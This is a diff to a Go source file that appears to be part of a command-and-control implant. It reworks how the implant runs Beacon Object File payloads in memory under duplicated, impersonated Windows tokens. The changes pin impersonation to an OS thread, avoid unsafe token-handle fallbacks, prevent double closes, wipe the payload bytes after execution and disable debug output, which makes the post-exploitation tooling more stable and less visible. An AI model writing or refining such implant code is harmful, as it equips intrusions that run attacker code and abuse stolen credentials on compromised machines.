@@ -6,8 +6,10 @@ package main
 
 import (
 	"crypto/rand"
+	"encoding/binary"
 	"encoding/hex"
 	"fmt"
+	"runtime"
 	"strings"
 	"sync"
 	"syscall"
@@ -24,7 +26,7 @@ const (
 	FLUSH_INTERVAL        = 30 * time.Second // Force flush every 30 seconds (was 10)
 	MIN_SEND_INTERVAL     = 10 * time.Second // Minimum between sends (was 5)
 	OUTPUT_CHECK_INTERVAL = 1 * time.Second  // Check for output every 1 second (was 500ms)
-	DEBUG_BOF_ASYNC       = true
+	DEBUG_BOF_ASYNC       = false
 	MAX_TOTAL_OUTPUT      = 10 * 1024 * 1024 // 10MB max total output
 )
 
@@ -74,7 +76,10 @@ var bofJobManager = &WorkManager{
 // generateJobID creates a unique job ID
 func generateJobID() string {
 	b := make([]byte, 8)
-	rand.Read(b)
+	if _, err := rand.Read(b); err != nil {
+		// Fallback: use timestamp-based ID if crypto/rand fails
+		binary.LittleEndian.PutUint64(b, uint64(time.Now().UnixNano()))
+	}
 	return hex.EncodeToString(b)
 }
 
@@ -146,12 +151,10 @@ func applyTokenContextWithDuplication(tokenContext *CredCtx) (func(), syscall.Ha
 			)
 
 			if err2 != nil {
-				// As last resort, try to use the original handle directly
-				// This is risky but better than nothing
-				duplicatedToken = currentNetOnlyHandle
-				cleanupFunc = func() {
-					// Don't close the original handle
-				}
+				// Both DuplicateTokenEx attempts failed -- do NOT fall back to
+				// the shared handle (unsafe concurrent use / double-close).
+				// Continue without token impersonation.
+				return func() {}, 0
 			} else {
 				cleanupFunc = func() {
 					CloseHandle(duplicatedToken)
@@ -184,15 +187,13 @@ func applyTokenContextWithDuplication(tokenContext *CredCtx) (func(), syscall.Ha
 			)
 
 			if err != nil {
-				// Fall back to using the original handle
-				duplicatedToken = token
-				cleanupFunc = func() {
-					// Don't close the original handle
-				}
-			} else {
-				cleanupFunc = func() {
-					CloseHandle(duplicatedToken)
-				}
+				// DuplicateTokenEx failed -- do NOT fall back to the shared
+				// handle (unsafe concurrent use / double-close).
+				// Continue without token impersonation.
+				return func() {}, 0
+			}
+			cleanupFunc = func() {
+				CloseHandle(duplicatedToken)
 			}
 
 			return cleanupFunc, duplicatedToken
@@ -255,10 +256,6 @@ func (bjm *WorkManager) executeBOFAsync(job *WorkItem) {
 	statusKilled := bofStatusKilled()
 	statusTimeout := bofStatusTimeout()
 	statusRunning := bofStatusRunning()
-	asyncStarted := bofAsyncStarted()
-	pipeSep := bofPipeSep()
-	cmdAsyncStatus := bofCmdAsyncStatus()
-
 	defer func() {
 		if r := recover(); r != nil {
 			job.OutputMutex.Lock()
@@ -275,24 +272,9 @@ func (bjm *WorkManager) executeBOFAsync(job *WorkItem) {
 		}
 	}()
 
-	// Send start notification through OutputManager
-	startMsg := asyncStarted + pipeSep + job.ID + pipeSep + job.Name
-	startResult := &OpResult{
-		Cmd: Msg{
-			Cmd:     cmdAsyncStatus,
-			CID:   job.CID,
-			DID: job.DID,
-			AID:     job.AID,
-		},
-		Output:      startMsg,
-		EC:    0,
-		Done: time.Now().Format(time.RFC3339),
-		JobID:       job.ID,
-	}
-	resultManager.addResult(startResult)
-
 	// Create channels for coordination
 	bofDone := make(chan struct{})
+	var closeBofDone sync.Once
 	outputDone := make(chan struct{})
 
 	// Track accumulated data
@@ -424,7 +406,11 @@ func (bjm *WorkManager) executeBOFAsync(job *WorkItem) {
 
 	// execute BOF in separate goroutine with duplicated token
 	go func() {
-		defer close(bofDone)
+		// Lock this goroutine to its OS thread so token impersonation
+		// (which is per-thread) is not lost to goroutine migration.
+		runtime.LockOSThread()
+		defer runtime.UnlockOSThread()
+		defer closeBofDone.Do(func() { close(bofDone) })
 
 		// Duplicate and apply token context for this BOF execution
 		cleanupToken, duplicatedTokenHandle := applyTokenContextWithDuplication(job.CredCtx)
@@ -465,6 +451,9 @@ func (bjm *WorkManager) executeBOFAsync(job *WorkItem) {
 		// IMPORTANT: The impersonation must be active during this call
 		output, err := LoadWithTimeout(job.BOFBytes, job.Args, 30*time.Minute)
 
+		job.BOFBytes = nil
+		job.Args = nil
+
 		// Revert impersonation AFTER BOF execution completes
 		if duplicatedTokenHandle != 0 {
 			RevertToSelf()
@@ -478,6 +467,9 @@ func (bjm *WorkManager) executeBOFAsync(job *WorkItem) {
 	}()
 
 	// Wait for completion, cancellation, or timeout
+	timeout := time.NewTimer(30 * time.Minute)
+	defer timeout.Stop()
+
 	select {
 	case result := <-resultChan:
 		// Wait for output monitor to finish
@@ -509,7 +501,7 @@ func (bjm *WorkManager) executeBOFAsync(job *WorkItem) {
 
 
 	case <-job.CancelChan:
-		close(bofDone)
+		closeBofDone.Do(func() { close(bofDone) })
 		<-outputDone
 
 		job.OutputMutex.Lock()
@@ -523,8 +515,8 @@ func (bjm *WorkManager) executeBOFAsync(job *WorkItem) {
 		// Queue final chunk through OutputManager
 		bjm.queueOutputChunk(job, finalOutput, true)
 
-	case <-time.After(30 * time.Minute):
-		close(bofDone)
+	case <-timeout.C:
+		closeBofDone.Do(func() { close(bofDone) })
 		<-outputDone
 
 		job.OutputMutex.Lock()
@@ -850,14 +842,3 @@ func (bjm *WorkManager) getJob(jobID string) (*WorkItem, bool) {
 	return job, exists
 }
 
-// Initialize cleanup routine
-func init() {
-	go func() {
-		ticker := time.NewTicker(1 * time.Hour)
-		defer ticker.Stop()
-
-		for range ticker.C {
-			bofJobManager.cleanupOldJobs(24 * time.Hour)
-		}
-	}()
-}
